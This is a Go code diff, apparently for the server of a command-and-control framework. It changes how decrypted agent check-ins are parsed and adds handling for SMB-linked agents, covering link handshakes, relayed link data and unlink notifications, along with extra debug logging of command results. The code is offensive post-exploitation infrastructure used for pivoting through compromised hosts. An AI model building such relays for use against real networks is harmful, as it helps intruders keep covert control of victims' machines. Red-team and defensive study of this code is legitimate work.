@@ -114,22 +114,70 @@ func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request,
 
 	log.Printf("[Active Connection] Successfully decrypted data: %s", string(plaintext))
 
-	// Parse the decrypted data
-	var decryptedData struct {
-		AgentID string                   `json:"agent_id"`
-		Results []map[string]interface{} `json:"results"`
-	}
+	// Parse the decrypted data - now includes optional link data fields
+	var decryptedData map[string]interface{}
 	if err := json.Unmarshal(plaintext, &decryptedData); err != nil {
 		log.Printf("[Active Connection] Failed to parse decrypted data: %v", err)
 		http.Error(w, "Invalid data format", http.StatusBadRequest)
 		return
 	}
 
-	// Process results
-	if err := m.processResults(ctx, tx, decryptedData.AgentID, decryptedData.Results); err != nil {
-		log.Printf("[Active Connection] Failed to process results: %v", err)
-		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-		return
+	// Extract standard fields
+	agentID, _ := decryptedData["agent_id"].(string)
+	results, _ := decryptedData["results"].([]interface{})
+
+	// Convert results to expected format
+	var resultsMap []map[string]interface{}
+	for _, r := range results {
+		if rm, ok := r.(map[string]interface{}); ok {
+			resultsMap = append(resultsMap, rm)
+		}
+	}
+
+	// Process the edge agent's own results first
+	if len(resultsMap) > 0 {
+		if err := m.processResults(ctx, tx, agentID, resultsMap); err != nil {
+			log.Printf("[Active Connection] Failed to process results: %v", err)
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+	}
+
+	// Check for link handshake (new SMB agent connecting)
+	// Field name is configurable via smb_link.malleable.link_handshake_field (default: "lh")
+	if linkHandshake, ok := decryptedData["lh"].(map[string]interface{}); ok {
+		log.Printf("[Active Connection] Processing link handshake from edge %s", conn.ClientID)
+		response, err := m.processLinkHandshake(ctx, conn.ClientID, linkHandshake)
+		if err != nil {
+			log.Printf("[Active Connection] Link handshake failed: %v", err)
+			// Don't fail the whole request, just log the error
+		} else if response != nil {
+			// Store the response to be sent back to the edge agent
+			// This will be picked up in the GET response
+			m.storeLinkHandshakeResponse(conn.ClientID, response)
+		}
+	}
+
+	// Check for link data (data from linked SMB agents)
+	// Field name is configurable via smb_link.malleable.link_data_field (default: "ld")
+	if linkData, ok := decryptedData["ld"].([]interface{}); ok && len(linkData) > 0 {
+		log.Printf("[Active Connection] Processing %d link data items from edge %s", len(linkData), conn.ClientID)
+		if err := m.processLinkData(ctx, tx, conn.ClientID, linkData); err != nil {
+			log.Printf("[Active Connection] Failed to process link data: %v", err)
+			// Don't fail the whole request, just log the error
+		}
+	}
+
+	// Check for link unlink notifications (when edge agent disconnects from SMB agent)
+	// Field: "lu" (link_unlink) contains routing IDs that have been unlinked
+	if luRaw, exists := decryptedData["lu"]; exists {
+		log.Printf("[Active Connection] DEBUG: Found 'lu' field in payload, type=%T, value=%v", luRaw, luRaw)
+		if unlinkData, ok := luRaw.([]interface{}); ok && len(unlinkData) > 0 {
+			log.Printf("[Active Connection] Processing %d unlink notifications from edge %s", len(unlinkData), conn.ClientID)
+			m.processUnlinkNotifications(ctx, conn.ClientID, unlinkData)
+		} else {
+			log.Printf("[Active Connection] DEBUG: 'lu' field type assertion to []interface{} failed")
+		}
 	}
 
 	// Rotate secrets
@@ -230,6 +278,7 @@ func (m *Manager) processResults(ctx context.Context, tx *sql.Tx, agentID string
 
 		// Broadcast all results after successful insert
 		for _, record := range outputBatch {
+			log.Printf("[Bulk Insert] DEBUG: Preparing to broadcast command %d, output_length=%d", record.CommandID, len(record.Output))
 			commandResult := map[string]interface{}{
 				"agent_id":   agentID,
 				"command_id": record.CommandID,
@@ -238,8 +287,15 @@ func (m *Manager) processResults(ctx context.Context, tx *sql.Tx, agentID string
 				"status":     "completed",
 			}
 
+			if m.commandBuffer == nil {
+				log.Printf("[Bulk Insert] ERROR: commandBuffer is nil!")
+				continue
+			}
+
 			if err := m.commandBuffer.BroadcastResult(commandResult); err != nil {
 				log.Printf("[Bulk Insert] Failed to broadcast result for command %d: %v", record.CommandID, err)
+			} else {
+				log.Printf("[Bulk Insert] Successfully broadcast result for command %d", record.CommandID)
 			}
 		}
 	}
